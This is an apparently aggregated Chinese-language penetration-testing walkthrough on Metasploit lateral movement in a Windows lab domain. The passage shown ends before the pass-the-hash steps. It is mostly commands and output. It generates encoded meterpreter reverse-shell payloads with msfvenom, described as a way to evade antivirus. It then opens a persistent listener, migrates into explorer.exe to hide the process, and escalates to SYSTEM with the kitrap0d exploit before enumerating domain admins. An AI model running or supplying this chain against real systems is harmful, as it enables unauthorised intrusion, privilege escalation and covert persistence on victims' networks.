---
title: 使用 MSF 进行 PtH 和 PtT
url: https://buaq.net/go-155214.html
source: unSafe.sh - 不安全
date: 2023-03-26
fetch_date: 2025-10-04T10:42:27.866465
---

# 使用 MSF 进行 PtH 和 PtT

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

使用 MSF 进行 PtH 和 PtT

0x00 概述环境攻击机 MSF：172.20.10.2DC (Server2008R2X64)：10.11.11
*2023-3-25 08:0:0
Author: [wyb0.com(查看原文)](/jump-155214.htm)
阅读量:38
收藏*

---

### 0x00 概述

* 环境

  攻击机 MSF：172.20.10.2
* PtH 和 PtT

  PtH 一般用来进行域内横向
  PtT 一般是在已经获取域控的前提下利用，用来做权限维持

### 0x01 前期准备

* 生成 payload

  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -b '\x00\x0a\xff' --platform windows -a x86  -e x86/shikata_ga_nai -i 5  -f exe -o 86.exe

  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.10.2 LPORT=4444 -b '\x00' --platform windows -a x64  -e x64/xor -i 5  -f exe -o 64.exe

  # -p 指定 payload (用 msfvenom -l payloads 可查看所有 payload)
  # -a 指定目标指令集架构
  # -e 指定用什么编码器编码(多次编码变幻可以免杀，用 msfvenom -l encoders 可查看编码类型)
  # -i 指定编码迭代的次数
  # --platform 执行目标的平台
  # -f 指定输出格式，可用 msfvenom --help-formats查看
  ```
* 配置监听

  ExitOnSession 在接收到 seesion 后继续监听端口，防止假死与假 session
  SessionCommunicationTimeout 默认情况下，会话在 5 分钟没有任何活动会被杀死，可将此项修改为 0
  SessionExpirationTimeout 默认情况下，一个星期后，会话将被强制关闭，修改为0可永久不会被关闭
  EnableStageEncoding 用来设置二级有效负载是否进行编码
  StageEncoder 指定编码器类型
  StageEncoder 指定的编码器对有效负载编码时失败后，是否回退到默认编码器（例如 x86/shikata\_ga\_nai）。如果将 set StageEncodingFallback 设置为 false，则在编码失败时将不会回退到默认编码器。这可以帮助确保有效负载编码的一致性和可靠性。
  exploit -j -z -j 为后台任务，-z 为成功后不主动发送 stage

  ```
  msf > use exploit/multi/handler
  msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
  msf exploit(multi/handler) > set LHOST 0.0.0.0
  msf exploit(multi/handler) > set LPORT 4444
  msf exploit(multi/handler) > set ExitOnSession false
  msf exploit(multi/handler) > set SessionCommunicationTimeout 36000
  msf exploit(multi/handler) > set SessionExpirationTimeout 36000
  // msf exploit(multi/handler) > set EnableStageEncoding true
  // msf exploit(multi/handler) > set StageEncoder x64/xor
  // msf exploit(multi/handler) > set StageEncodingFallback false
  msf exploit(multi/handler) > exploit -j -z
  [*] Exploit running as background job 0.
  [*] Started reverse TCP handler on 0.0.0.0:4444

  msf exploit(multi/handler) > jobs

  Jobs
  ====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:4444
  ```

### 0x02 目标机反弹 shell

* 在目标主机上执行生成的 payload：86.exe，收到 shell

  ```
  msf6 exploit(multi/handler) >
  [*] Sending stage (175686 bytes) to 172.20.10.2
  [*] Meterpreter session 1 opened (172.20.10.2:4444 -> 172.20.10.2:60181) at 2023-03-06 12:31:17 +0800

  msf6 exploit(multi/handler) > sessions

  Active sessions
  ===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  TEST\zhangsan @ WIN7PRO  172.20.10.2:4444 -> 172.20.10.14:60997 (172.20.10.14)

  msf6 exploit(multi/handler) > sessions 1
  [*] Starting interaction with 1...

  meterpreter > getuid
  Server username: TEST\zhangsan
  ```
* 进程迁移

  将进程迁移到了资源管理器，防止目标通过任务管理器或者使用 tasklist 看到我们的进程。
  一般注入 svchost.exe、explorer.exe、lsass.exe、services.exe、winlogon.exe、rundll32.exe、taskhost.exe、spoolsv.exe

  ```
  meterpreter > ps

  Process List
  ============

  PID   PPID  Name               Arch  Session  User           Path
  ---   ----  ----               ----  -------  ----           ----
  0     0     [System Process]
  4     0     System
  272   4     smss.exe
  444   384   winlogon.exe
  504   396   lsass.exe
  692   832   dwm.exe            x86   1        TEST\zhangsan  C:\Windows\system32\Dwm.exe
  808   1272  explorer.exe       x86   1        TEST\zhangsan  C:\Windows\Explorer.EXE
  1548  488   kms-server.exe
  1964  488   taskhost.exe       x86   1        TEST\zhangsan  C:\Windows\system32\taskhost.exe
  2072  2748  msiexec.exe        x86   1                       C:\Windows\System32\msiexec.exe

  meterpreter > migrate 808
  [*] Migrating from 2748 to 808...
  [*] Migration completed successfully.

  meterpreter > background
  [*] Backgrounding session 1...
  ```
* 进行提权

  通过 local\_exploit\_suggester 获取 msf 建议的 exploit

  ```
  msf6 exploit(multi/handler) > run post/multi/recon/local_exploit_suggester
  msf6 post(multi/recon/local_exploit_suggester) > set session 1
  msf6 post(multi/recon/local_exploit_suggester) > run

  [*] 172.20.10.2 - Collecting local exploits for x86/windows...
  [*] 172.20.10.2 - 168 exploit checks are being tried...
  [+] 172.20.10.2 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
  [+] 172.20.10.2 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  [+] 172.20.10.2 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
  [+] 172.20.10.2 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  [*] Running check method for exploit 41 / 41
  [*] 172.20.10.2 - Valid modules for session 3:
  ============================

  #   Name                                                           Potentially Vulnerable?  Check Result
  -   ----                                                           -----------------------  ------------
  1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
  2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
  3   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
  4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
  5   exploit/windows/local/bthpan                                    No                       The target is not exploitable.
  。。。。
  。。。。

  [*] Post module execution completed
  ```

  利用 msf 建议的 exploit 进行提权

  ```
  msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
  msf6 exploit(exploit/windows/local/ms10_015_kitrap0d) > set session 1
  msf6 exploit(windows/local/ms10_015_kitrap0d) > run

  [*] Started reverse TCP handler on 172.20.10.2:4444
  [*] Reflectively injecting payload and triggering the bug...
  [*] Launching msiexec to host the DLL...
  [+] Process 2072 launched.
  [*] Reflectively injecting the DLL into 2072...
  [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
  [*] Sending stage (175686 bytes) to 172.20.10.2
  [*] Meterpreter session 2 opened (172.20.10.2:4444 -> 172.20.10.14:61686) at 2023-03-06 12:40:02 +0800

  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  meterpreter > shell
  Process 680 created.
  Channel 2 created.
  Microsoft Windows [�汾 6.1.7600]
  ��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ��

  C:\Users\zhangsan\Desktop>chcp 65001
  chcp 65001
  Active code page: 65001

  C:\Users\zhangsan\Desktop>net group "domain admins" /domain
  net group "domain admins" /domain
  The request will be processed at a domain controller for domain test.com.

  Group name     Domain Admins
  Comment        ָ���������Ա

  Members

  -------------------------------------------------------------------------------
  admin                    Administrator
  The command completed successfully.

  C:\Users\zhangsan\Desktop>exit
  exit
  meterpreter > background
  [*] Backgrounding session 2...
  msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions

  Active sessions
  ===============

  Id  Nam...